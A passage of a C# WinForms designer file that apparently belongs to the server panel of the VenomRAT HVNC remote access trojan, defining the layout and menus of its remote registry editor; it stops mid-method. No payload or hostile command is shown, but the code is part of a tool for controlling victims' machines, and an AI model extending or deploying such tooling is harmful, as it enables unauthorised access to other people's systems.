namespace VenomRAT_HVNC.Server.Forms
{
	public partial class FormRegistryEditor : global::System.Windows.Forms.Form
	{
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
            global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::VenomRAT_HVNC.Server.Forms.FormRegistryEditor));
			this.tableLayoutPanel = new global::System.Windows.Forms.TableLayoutPanel();
			this.statusStrip = new global::System.Windows.Forms.StatusStrip();
			this.selectedStripStatusLabel = new global::System.Windows.Forms.ToolStripStatusLabel();
			this.menuStrip = new global::System.Windows.Forms.MenuStrip();
			this.fileToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.exitToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.editToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.modifyToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.modifyBinaryDataToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.modifyNewtoolStripSeparator = new global::System.Windows.Forms.ToolStripSeparator();
			this.newToolStripMenuItem2 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.keyToolStripMenuItem2 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator7 = new global::System.Windows.Forms.ToolStripSeparator();
			this.stringValueToolStripMenuItem2 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.binaryValueToolStripMenuItem2 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.dWORD32bitValueToolStripMenuItem2 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.qWORD64bitValueToolStripMenuItem2 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.multiStringValueToolStripMenuItem2 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.expandableStringValueToolStripMenuItem2 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator6 = new global::System.Windows.Forms.ToolStripSeparator();
			this.deleteToolStripMenuItem2 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.renameToolStripMenuItem2 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.imageRegistryDirectoryList = new global::System.Windows.Forms.ImageList(this.components);
			this.imageRegistryKeyTypeList = new global::System.Windows.Forms.ImageList(this.components);
			this.tv_ContextMenuStrip = new global::System.Windows.Forms.ContextMenuStrip(this.components);
			this.newToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.keyToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator2 = new global::System.Windows.Forms.ToolStripSeparator();
			this.stringValueToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.binaryValueToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.dWORD32bitValueToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.qWORD64bitValueToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.multiStringValueToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.expandableStringValueToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator1 = new global::System.Windows.Forms.ToolStripSeparator();
			this.deleteToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.renameToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.selectedItem_ContextMenuStrip = new global::System.Windows.Forms.ContextMenuStrip(this.components);
			this.modifyToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.modifyBinaryDataToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.modifyToolStripSeparator1 = new global::System.Windows.Forms.ToolStripSeparator();
			this.deleteToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.renameToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.lst_ContextMenuStrip = new global::System.Windows.Forms.ContextMenuStrip(this.components);
			this.newToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.keyToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator4 = new global::System.Windows.Forms.ToolStripSeparator();
			this.stringValueToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.binaryValueToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.dWORD32bitValueToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.qWORD64bitValueToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.multiStringValueToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.expandableStringValueToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.timer1 = new global::System.Windows.Forms.Timer(this.components);
			this.guna2DragControl1 = new global::Guna.UI2.WinForms.Guna2DragControl(this.components);
			this.guna2Panel1 = new global::Guna.UI2.WinForms.Guna2Panel();
			this.label1 = new global::System.Windows.Forms.Label();
			this.guna2Separator2 = new global::Guna.UI2.WinForms.Guna2Separator();
			this.guna2Separator1 = new global::Guna.UI2.WinForms.Guna2Separator();
			this.guna2ControlBox1 = new global::Guna.UI2.WinForms.Guna2ControlBox();
			this.tvRegistryDirectory = new global::VenomRAT_HVNC.Server.Helper.RegistryTreeView();
			this.lstRegistryValues = new global::VenomRAT_HVNC.Server.Helper.AeroListView();
			this.hName = new global::System.Windows.Forms.ColumnHeader();
			this.hType = new global::System.Windows.Forms.ColumnHeader();
			this.hValue = new global::System.Windows.Forms.ColumnHeader();
			this.guna2BorderlessForm1 = new global::Guna.UI2.WinForms.Guna2BorderlessForm(this.components);
			this.tableLayoutPanel.SuspendLayout();
			this.statusStrip.SuspendLayout();
			this.menuStrip.SuspendLayout();
			this.tv_ContextMenuStrip.SuspendLayout();
			this.selectedItem_ContextMenuStrip.SuspendLayout();
			this.lst_ContextMenuStrip.SuspendLayout();
			this.guna2Panel1.SuspendLayout();
			base.SuspendLayout();
			this.tableLayoutPanel.BackColor = global::System.Drawing.Color.FromArgb(37, 37, 37);
			this.tableLayoutPanel.ColumnCount = 1;
			this.tableLayoutPanel.ColumnStyles.Add(new global::System.Windows.Forms.ColumnStyle(global::System.Windows.Forms.SizeType.Percent, 100f));
			this.tableLayoutPanel.Controls.Add(this.statusStrip, 0, 2);
			this.tableLayoutPanel.GrowStyle = global::System.Windows.Forms.TableLayoutPanelGrowStyle.FixedSize;
			this.tableLayoutPanel.Location = new global::System.Drawing.Point(141, 563);
			this.tableLayoutPanel.Name = "tableLayoutPanel";
			this.tableLayoutPanel.RowCount = 3;
			this.tableLayoutPanel.RowStyles.Add(new global::System.Windows.Forms.RowStyle(global::System.Windows.Forms.SizeType.Absolute, 25f));
			this.tableLayoutPanel.RowStyles.Add(new global::System.Windows.Forms.RowStyle(global::System.Windows.Forms.SizeType.Percent, 100f));
			this.tableLayoutPanel.RowStyles.Add(new global::System.Windows.Forms.RowStyle(global::System.Windows.Forms.SizeType.Absolute, 22f));
			this.tableLayoutPanel.Size = new global::System.Drawing.Size(87, 24);
			this.tableLayoutPanel.TabIndex = 0;
			this.statusStrip.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.statusStrip.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.selectedStripStatusLabel });
			this.statusStrip.Location = new global::System.Drawing.Point(0, 2);
			this.statusStrip.Name = "statusStrip";
			this.statusStrip.Size = new global::System.Drawing.Size(87, 22);
			this.statusStrip.TabIndex = 1;
			this.statusStrip.Text = "statusStrip";
			this.selectedStripStatusLabel.Name = "selectedStripStatusLabel";
			this.selectedStripStatusLabel.Size = new global::System.Drawing.Size(0, 17);
			this.menuStrip.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.menuStrip.Dock = global::System.Windows.Forms.DockStyle.None;
			this.menuStrip.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.fileToolStripMenuItem, this.editToolStripMenuItem });
			this.menuStrip.Location = new global::System.Drawing.Point(0, 61);
			this.menuStrip.Name = "menuStrip";
			this.menuStrip.Size = new global::System.Drawing.Size(84, 24);
			this.menuStrip.TabIndex = 2;
			this.fileToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.exitToolStripMenuItem });
			this.fileToolStripMenuItem.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.fileToolStripMenuItem.Name = "fileToolStripMenuItem";
			this.fileToolStripMenuItem.Size = new global::System.Drawing.Size(37, 20);
			this.fileToolStripMenuItem.Text = "File";
			this.exitToolStripMenuItem.Name = "exitToolStripMenuItem";
			this.exitToolStripMenuItem.Size = new global::System.Drawing.Size(93, 22);
			this.exitToolStripMenuItem.Text = "Exit";
			this.exitToolStripMenuItem.Click += new global::System.EventHandler(this.menuStripExit_Click);
			this.editToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.modifyToolStripMenuItem1, this.modifyBinaryDataToolStripMenuItem1, this.modifyNewtoolStripSeparator, this.newToolStripMenuItem2, this.toolStripSeparator6, this.deleteToolStripMenuItem2, this.renameToolStripMenuItem2 });
			this.editToolStripMenuItem.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.editToolStripMenuItem.Name = "editToolStripMenuItem";
			this.editToolStripMenuItem.Size = new global::System.Drawing.Size(39, 20);
			this.editToolStripMenuItem.Text = "Edit";
			this.editToolStripMenuItem.DropDownOpening += new global::System.EventHandler(this.editToolStripMenuItem_DropDownOpening);
			this.modifyToolStripMenuItem1.Enabled = false;
			this.modifyToolStripMenuItem1.Font = new global::System.Drawing.Font("Segoe UI", 9f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.modifyToolStripMenuItem1.Name = "modifyToolStripMenuItem1";
			this.modifyToolStripMenuItem1.Size = new global::System.Drawing.Size(184, 22);
			this.modifyToolStripMenuItem1.Text = "Modify...";
			this.modifyToolStripMenuItem1.Visible = false;
			this.modifyToolStripMenuItem1.Click += new global::System.EventHandler(this.modifyRegistryValue_Click);
			this.modifyBinaryDataToolStripMenuItem1.Enabled = false;
			this.modifyBinaryDataToolStripMenuItem1.Name = "modifyBinaryDataToolStripMenuItem1";
			this.modifyBinaryDataToolStripMenuItem1.Size = new global::System.Drawing.Size(184, 22);
			this.modifyBinaryDataToolStripMenuItem1.Text = "Modify Binary Data...";
			this.modifyBinaryDataToolStripMenuItem1.Visible = false;
			this.modifyBinaryDataToolStripMenuItem1.Click += new global::System.EventHandler(this.modifyBinaryDataRegistryValue_Click);
			this.modifyNewtoolStripSeparator.Name = "modifyNewtoolStripSeparator";
			this.modifyNewtoolStripSeparator.Size = new global::System.Drawing.Size(181, 6);
			this.modifyNewtoolStripSeparator.Visible = false;
			this.newToolStripMenuItem2.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.keyToolStripMenuItem2, this.toolStripSeparator7, this.stringValueToolStripMenuItem2, this.binaryValueToolStripMenuItem2, this.dWORD32bitValueToolStripMenuItem2, this.qWORD64bitValueToolStripMenuItem2, this.multiStringValueToolStripMenuItem2, this.expandableStringValueToolStripMenuItem2 });
			this.newToolStripMenuItem2.Name = "newToolStripMenuItem2";
			this.newToolStripMenuItem2.Size = new global::System.Drawing.Size(184, 22);
			this.newToolStripMenuItem2.Text = "New";
			this.keyToolStripMenuItem2.Name = "keyToolStripMenuItem2";
			this.keyToolStripMenuItem2.Size = new global::System.Drawing.Size(200, 22);
			this.keyToolStripMenuItem2.Text = "Key";
			this.keyToolStripMenuItem2.Click += new global::System.EventHandler(this.createNewRegistryKey_Click);
			this.toolStripSeparator7.Name = "toolStripSeparator7";
			this.toolStripSeparator7.Size = new global::System.Drawing.Size(197, 6);
			this.stringValueToolStripMenuItem2.Name = "stringValueToolStripMenuItem2";
			this.stringValueToolStripMenuItem2.Size = new global::System.Drawing.Size(200, 22);
			this.stringValueToolStripMenuItem2.Text = "String Value";
			this.stringValueToolStripMenuItem2.Click += new global::System.EventHandler(this.createStringRegistryValue_Click);
			this.binaryValueToolStripMenuItem2.Name = "binaryValueToolStripMenuItem2";
			this.binaryValueToolStripMenuItem2.Size = new global::System.Drawing.Size(200, 22);
			this.binaryValueToolStripMenuItem2.Text = "Binary Value";
			this.binaryValueToolStripMenuItem2.Click += new global::System.EventHandler(this.createBinaryRegistryValue_Click);
			this.dWORD32bitValueToolStripMenuItem2.Name = "dWORD32bitValueToolStripMenuItem2";
			this.dWORD32bitValueToolStripMenuItem2.Size = new global::System.Drawing.Size(200, 22);
			this.dWORD32bitValueToolStripMenuItem2.Text = "DWORD (32-bit) Value";
			this.dWORD32bitValueToolStripMenuItem2.Click += new global::System.EventHandler(this.createDwordRegistryValue_Click);
			this.qWORD64bitValueToolStripMenuItem2.Name = "qWORD64bitValueToolStripMenuItem2";
			this.qWORD64bitValueToolStripMenuItem2.Size = new global::System.Drawing.Size(200, 22);
			this.qWORD64bitValueToolStripMenuItem2.Text = "QWORD (64-bit) Value";
			this.qWORD64bitValueToolStripMenuItem2.Click += new global::System.EventHandler(this.createQwordRegistryValue_Click);
			this.multiStringValueToolStripMenuItem2.Name = "multiStringValueToolStripMenuItem2";
			this.multiStringValueToolStripMenuItem2.Size = new global::System.Drawing.Size(200, 22);
			this.multiStringValueToolStripMenuItem2.Text = "Multi-String Value";
			this.multiStringValueToolStripMenuItem2.Click += new global::System.EventHandler(this.createMultiStringRegistryValue_Click);
			this.expandableStringValueToolStripMenuItem2.Name = "expandableStringValueToolStripMenuItem2";
			this.expandableStringValueToolStripMenuItem2.Size = new global::System.Drawing.Size(200, 22);
			this.expandableStringValueToolStripMenuItem2.Text = "Expandable String Value";
			this.expandableStringValueToolStripMenuItem2.Click += new global::System.EventHandler(this.createExpandStringRegistryValue_Click);
			this.toolStripSeparator6.Name = "toolStripSeparator6";
			this.toolStripSeparator6.Size = new global::System.Drawing.Size(181, 6);
			this.deleteToolStripMenuItem2.Enabled = false;
			this.deleteToolStripMenuItem2.Name = "deleteToolStripMenuItem2";
			this.deleteToolStripMenuItem2.ShortcutKeyDisplayString = "Del";
			this.deleteToolStripMenuItem2.Size = new global::System.Drawing.Size(184, 22);
			this.deleteToolStripMenuItem2.Text = "Delete";
			this.deleteToolStripMenuItem2.Click += new global::System.EventHandler(this.menuStripDelete_Click);
			this.renameToolStripMenuItem2.Enabled = false;
			this.renameToolStripMenuItem2.Name = "renameToolStripMenuItem2";
			this.renameToolStripMenuItem2.Size = new global::System.Drawing.Size(184, 22);
			this.renameToolStripMenuItem2.Text = "Rename";
			this.renameToolStripMenuItem2.Click += new global::System.EventHandler(this.menuStripRename_Click);
			this.imageRegistryDirectoryList.TransparentColor = global::System.Drawing.Color.Transparent;
			this.imageRegistryDirectoryList.Images.SetKeyName(0, "folder.png");
			this.imageRegistryKeyTypeList.TransparentColor = global::System.Drawing.Color.Transparent;
			this.imageRegistryKeyTypeList.Images.SetKeyName(0, "reg_string.png");
			this.imageRegistryKeyTypeList.Images.SetKeyName(1, "reg_binary.png");
			this.tv_ContextMenuStrip.BackColor = global::System.Drawing.Color.FromArgb(12, 89, 71);
			this.tv_ContextMenuStrip.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.newToolStripMenuItem, this.toolStripSeparator1, this.deleteToolStripMenuItem, this.renameToolStripMenuItem });
			this.tv_ContextMenuStrip.Name = "contextMenuStrip";
			this.tv_ContextMenuStrip.RenderMode = global::System.Windows.Forms.ToolStripRenderMode.System;
			this.tv_ContextMenuStrip.Size = new global::System.Drawing.Size(118, 76);
			this.newToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.keyToolStripMenuItem, this.toolStripSeparator2, this.stringValueToolStripMenuItem, this.binaryValueToolStripMenuItem, this.dWORD32bitValueToolStripMenuItem, this.qWORD64bitValueToolStripMenuItem, this.multiStringValueToolStripMenuItem, this.expandableStringValueToolStripMenuItem });
			this.newToolStripMenuItem.Name = "newToolStripMenuItem";
			this.newToolStripMenuItem.Size = new global::System.Drawing.Size(117, 22);
			this.newToolStripMenuItem.Text = "New";
			this.keyToolStripMenuItem.Name = "keyToolStripMenuItem";
			this.keyToolStripMenuItem.Size = new global::System.Drawing.Size(200, 22);
			this.keyToolStripMenuItem.Text = "Key";
			this.keyToolStripMenuItem.Click += new global::System.EventHandler(this.createNewRegistryKey_Click);
			this.toolStripSeparator2.Name = "toolStripSeparator2";
			this.toolStripSeparator2.Size = new global::System.Drawing.Size(197, 6);
			this.stringValueToolStripMenuItem.Name = "stringValueToolStripMenuItem";
			this.stringValueToolStripMenuItem.Size = new global::System.Drawing.Size(200, 22);
			this.stringValueToolStripMenuItem.Text = "String Value";
			this.stringValueToolStripMenuItem.Click += new global::System.EventHandler(this.createStringRegistryValue_Click);
			this.binaryValueToolStripMenuItem.Name = "binaryValueToolStripMenuItem";
			this.binaryValueToolStripMenuItem.Size = new global::System.Drawing.Size(200, 22);
			this.binaryValueToolStripMenuItem.Text = "Binary Value";
			this.binaryValueToolStripMenuItem.Click += new global::System.EventHandler(this.createBinaryRegistryValue_Click);
			this.dWORD32bitValueToolStripMenuItem.Name = "dWORD32bitValueToolStripMenuItem";
			this.dWORD32bitValueToolStripMenuItem.Size = new global::System.Drawing.Size(200, 22);
			this.dWORD32bitValueToolStripMenuItem.Text = "DWORD (32-bit) Value";
			this.dWORD32bitValueToolStripMenuItem.Click += new global::System.EventHandler(this.createDwordRegistryValue_Click);
			this.qWORD64bitValueToolStripMenuItem.Name = "qWORD64bitValueToolStripMenuItem";
			this.qWORD64bitValueToolStripMenuItem.Size = new global::System.Drawing.Size(200, 22);
			this.qWORD64bitValueToolStripMenuItem.Text = "QWORD (64-bit) Value";
			this.qWORD64bitValueToolStripMenuItem.Click += new global::System.EventHandler(this.createQwordRegistryValue_Click);
			this.multiStringValueToolStripMenuItem.Name = "multiStringValueToolStripMenuItem";
			this.multiStringValueToolStripMenuItem.Size = new global::System.Drawing.Size(200, 22);
			this.multiStringValueToolStripMenuItem.Text = "Multi-String Value";
			this.multiStringValueToolStripMenuItem.Click += new global::System.EventHandler(this.createMultiStringRegistryValue_Click);
			this.expandableStringValueToolStripMenuItem.Name = "expandableStringValueToolStripMenuItem";
			this.expandableStringValueToolStripMenuItem.Size = new global::System.Drawing.Size(200, 22);
			this.expandableStringValueToolStripMenuItem.Text = "Expandable String Value";
			this.expandableStringValueToolStripMenuItem.Click += new global::System.EventHandler(this.createExpandStringRegistryValue_Click);
			this.toolStripSeparator1.Name = "toolStripSeparator1";
			this.toolStripSeparator1.Size = new global::System.Drawing.Size(114, 6);
			this.deleteToolStripMenuItem.Enabled = false;
			this.deleteToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.deleteToolStripMenuItem.Name = "deleteToolStripMenuItem";
			this.deleteToolStripMenuItem.Size = new global::System.Drawing.Size(117, 22);
			this.deleteToolStripMenuItem.Text = "Delete";
			this.deleteToolStripMenuItem.Click += new global::System.EventHandler(this.deleteRegistryKey_Click);
			this.renameToolStripMenuItem.Enabled = false;
			this.renameToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.renameToolStripMenuItem.Name = "renameToolStripMenuItem";
			this.renameToolStripMenuItem.Size = new global::System.Drawing.Size(117, 22);
			this.renameToolStripMenuItem.Text = "Rename";
			this.renameToolStripMenuItem.Click += new global::System.EventHandler(this.renameRegistryKey_Click);
			this.selectedItem_ContextMenuStrip.BackColor = global::System.Drawing.Color.FromArgb(12, 89, 71);
			this.selectedItem_ContextMenuStrip.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.modifyToolStripMenuItem, this.modifyBinaryDataToolStripMenuItem, this.modifyToolStripSeparator1, this.deleteToolStripMenuItem1, this.renameToolStripMenuItem1 });
			this.selectedItem_ContextMenuStrip.Name = "selectedItem_ContextMenuStrip";
			this.selectedItem_ContextMenuStrip.RenderMode = global::System.Windows.Forms.ToolStripRenderMode.System;
			this.selectedItem_ContextMenuStrip.Size = new global::System.Drawing.Size(185, 98);
			this.modifyToolStripMenuItem.Enabled = false;
			this.modifyToolStripMenuItem.Font = new global::System.Drawing.Font("Segoe UI", 9f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.modifyToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.modifyToolStripMenuItem.Name = "modifyToolStripMenuItem";
			this.modifyToolStripMenuItem.Size = new global::System.Drawing.Size(184, 22);
			this.modifyToolStripMenuItem.Text = "Modify...";
			this.modifyToolStripMenuItem.Click += new global::System.EventHandler(this.modifyRegistryValue_Click);
			this.modifyBinaryDataToolStripMenuItem.Enabled = false;
			this.modifyBinaryDataToolStripMenuItem.ForeColor = global::System.Drawing.Color.Black;
			this.modifyBinaryDataToolStripMenuItem.Name = "modifyBinaryDataToolStripMenuItem";
			this.modifyBinaryDataToolStripMenuItem.Size = new global::System.Drawing.Size(184, 22);
			this.modifyBinaryDataToolStripMenuItem.Text = "Modify Binary Data...";
			this.modifyBinaryDataToolStripMenuItem.Click += new global::System.EventHandler(this.modifyBinaryDataRegistryValue_Click);
			this.modifyToolStripSeparator1.Name = "modifyToolStripSeparator1";
			this.modifyToolStripSeparator1.Size = new global::System.Drawing.Size(181, 6);
			this.deleteToolStripMenuItem1.Name = "deleteToolStripMenuItem1";
			this.deleteToolStripMenuItem1.Size = new global::System.Drawing.Size(184, 22);
			this.deleteToolStripMenuItem1.Text = "Delete";
			this.deleteToolStripMenuItem1.Click += new global::System.EventHandler(this.deleteRegistryValue_Click);
			this.renameToolStripMenuItem1.Name = "renameToolStripMenuItem1";
			this.renameToolStripMenuItem1.Size = new global::System.Drawing.Size(184, 22);
			this.renameToolStripMenuItem1.Text = "Rename";
			this.renameToolStripMenuItem1.Click += new global::System.EventHandler(this.renameRegistryValue_Click);
			this.lst_ContextMenuStrip.BackColor = global::System.Drawing.Color.FromArgb(12, 89, 71);
			this.lst_ContextMenuStrip.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.newToolStripMenuItem1 });
			this.lst_ContextMenuStrip.Name = "lst_ContextMenuStrip";
			this.lst_ContextMenuStrip.RenderMode = global::System.Windows.Forms.ToolStripRenderMode.System;
			this.lst_ContextMenuStrip.Size = new global::System.Drawing.Size(99, 26);
			this.newToolStripMenuItem1.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.keyToolStripMenuItem1, this.toolStripSeparator4, this.stringValueToolStripMenuItem1, this.binaryValueToolStripMenuItem1, this.dWORD32bitValueToolStripMenuItem1, this.qWORD64bitValueToolStripMenuItem1, this.multiStringValueToolStripMenuItem1, this.expandableStringValueToolStripMenuItem1 });
			this.newToolStripMenuItem1.Name = "newToolStripMenuItem1";
			this.newToolStripMenuItem1.Size = new global::System.Drawing.Size(98, 22);
			this.newToolStripMenuItem1.Text = "New";
			this.keyToolStripMenuItem1.Name = "keyToolStripMenuItem1";
			this.keyToolStripMenuItem1.Size = new global::System.Drawing.Size(200, 22);
			this.keyToolStripMenuItem1.Text = "Key";
			this.keyToolStripMenuItem1.Click += new global::System.EventHandler(this.createNewRegistryKey_Click);
			this.toolStripSeparator4.Name = "toolStripSeparator4";
			this.toolStripSeparator4.Size = new global::System.Drawing.Size(197, 6);
			this.stringValueToolStripMenuItem1.Name = "stringValueToolStripMenuItem1";
			this.stringValueToolStripMenuItem1.Size = new global::System.Drawing.Size(200, 22);
			this.stringValueToolStripMenuItem1.Text = "String Value";
			this.stringValueToolStripMenuItem1.Click += new global::System.EventHandler(this.createStringRegistryValue_Click);
			this.binaryValueToolStripMenuItem1.Name = "binaryValueToolStripMenuItem1";
			this.binaryValueToolStripMenuItem1.Size = new global::System.Drawing.Size(200, 22);
			this.binaryValueToolStripMenuItem1.Text = "Binary Value";
			this.binaryValueToolStripMenuItem1.Click += new global::System.EventHandler(this.createBinaryRegistryValue_Click);
			this.dWORD32bitValueToolStripMenuItem1.Name = "dWORD32bitValueToolStripMenuItem1";
			this.dWORD32bitValueToolStripMenuItem1.Size = new global::System.Drawing.Size(200, 22);
			this.dWORD32bitValueToolStripMenuItem1.Text = "DWORD (32-bit) Value";
			this.dWORD32bitValueToolStripMenuItem1.Click += new global::System.EventHandler(this.createDwordRegistryValue_Click);
			this.qWORD64bitValueToolStripMenuItem1.Name = "qWORD64bitValueToolStripMenuItem1";
			this.qWORD64bitValueToolStripMenuItem1.Size = new global::System.Drawing.Size(200, 22);
			this.qWORD64bitValueToolStripMenuItem1.Text = "QWORD (64-bit) Value";
			this.qWORD64bitValueToolStripMenuItem1.Click += new global::System.EventHandler(this.createQwordRegistryValue_Click);
			this.multiStringValueToolStripMenuItem1.Name = "multiStringValueToolStripMenuItem1";
			this.multiStringValueToolStripMenuItem1.Size = new global::System.Drawing.Size(200, 22);
			this.multiStringValueToolStripMenuItem1.Text = "Multi-String Value";
			this.multiStringValueToolStripMenuItem1.Click += new global::System.EventHandler(this.createMultiStringRegistryValue_Click);
			this.expandableStringValueToolStripMenuItem1.Name = "expandableStringValueToolStripMenuItem1";
			this.expandableStringValueToolStripMenuItem1.Size = new global::System.Drawing.Size(200, 22);
			this.expandableStringValueToolStripMenuItem1.Text = "Expandable String Value";
			this.expandableStringValueToolStripMenuItem1.Click += new global::System.EventHandler(this.createExpandStringRegistryValue_Click);
			this.timer1.Interval = 2000;
			this.timer1.Tick += new global::System.EventHandler(this.timer1_Tick);
			this.guna2DragControl1.TargetControl = this.guna2Panel1;
			this.guna2Panel1.BackColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.guna2Panel1.Controls.Add(this.label1);
			this.guna2Panel1.Controls.Add(this.guna2Separator2);
			this.guna2Panel1.Controls.Add(this.guna2Separator1);
			this.guna2Panel1.Controls.Add(this.guna2ControlBox1);
			this.guna2Panel1.Dock = global::System.Windows.Forms.DockStyle.Top;
			this.guna2Panel1.Location = new global::System.Drawing.Point(0, 0);
			this.guna2Panel1.Name = "guna2Panel1";
			this.guna2Panel1.ShadowDecoration.Parent = this.guna2Panel1;
			this.guna2Panel1.Size = new global::System.Drawing.Size(783, 60);
			this.guna2Panel1.TabIndex = 3;
			this.label1.AutoSize = true;
			this.label1.Font = new global::System.Drawing.Font("Segoe UI", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label1.ForeColor = global::System.Drawing.Color.White;
			this.label1.Location = new global::System.Drawing.Point(3, 12);
			this.label1.Name = "label1";
			this.label1.Size = new global::System.Drawing.Size(112, 21);
			this.label1.TabIndex = 131;
			this.label1.Text = "Registry Editor";
			this.guna2Separator2.FillColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.guna2Separator2.FillStyle = global::System.Drawing.Drawing2D.DashStyle.Custom;
			this.guna2Separator2.FillThickness = 2;
			this.guna2Separator2.Location = new global::System.Drawing.Point(-2, 46);
			this.guna2Separator2.Name = "guna2Separator2";
			this.guna2Separator2.Size = new global::System.Drawing.Size(785, 12);
			this.guna2Separator2.TabIndex = 130;
			this.guna2Separator1.FillColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.guna2Separator1.FillStyle = global::System.Drawing.Drawing2D.DashStyle.Custom;
			this.guna2Separator1.FillThickness = 2;
			this.guna2Separator1.Location = new global::System.Drawing.Point(-2, -4);
			this.guna2Separator1.Name = "guna2Separator1";
			this.guna2Separator1.Size = new global::System.Drawing.Size(785, 12);
			this.guna2Separator1.TabIndex = 130;
			this.guna2ControlBox1.Anchor = global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right;
			this.guna2ControlBox1.BackColor = global::System.Drawing.Color.Transparent;
			this.guna2ControlBox1.FillColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.guna2ControlBox1.HoverState.Parent = this.guna2ControlBox1;
			this.guna2ControlBox1.IconColor = global::System.Drawing.Color.White;
			this.guna2ControlBox1.Location = new global::System.Drawing.Point(739, 12);
			this.guna2ControlBox1.Name = "guna2ControlBox1";
			this.guna2ControlBox1.ShadowDecoration.Parent = this.guna2ControlBox1;
			this.guna2ControlBox1.Size = new global::System.Drawing.Size(41, 32);
			this.guna2ControlBox1.TabIndex = 13;
			this.tvRegistryDirectory.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.tvRegistryDirectory.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.tvRegistryDirectory.HideSelection = false;
			this.tvRegistryDirectory.ImageIndex = 0;
			this.tvRegistryDirectory.ImageList = this.imageRegistryDirectoryList;
			this.tvRegistryDirectory.Location = new global::System.Drawing.Point(-2, 88);
			this.tvRegistryDirectory.Name = "tvRegistryDirectory";
			this.tvRegistryDirectory.SelectedImageIndex = 0;
			this.tvRegistryDirectory.Size = new global::System.Drawing.Size(292, 573);
			this.tvRegistryDirectory.TabIndex = 0;
			this.tvRegistryDirectory.AfterLabelEdit += new global::System.Windows.Forms.NodeLabelEditEventHandler(this.tvRegistryDirectory_AfterLabelEdit);
			this.tvRegistryDirectory.BeforeExpand += new global::System.Windows.Forms.TreeViewCancelEventHandler(this.tvRegistryDirectory_BeforeExpand);
			this.tvRegistryDirectory.BeforeSelect += new global::System.Windows.Forms.TreeViewCancelEventHandler(this.tvRegistryDirectory_BeforeSelect);
			this.tvRegistryDirectory.NodeMouseClick += new global::System.Windows.Forms.TreeNodeMouseClickEventHandler(this.tvRegistryDirectory_NodeMouseClick);
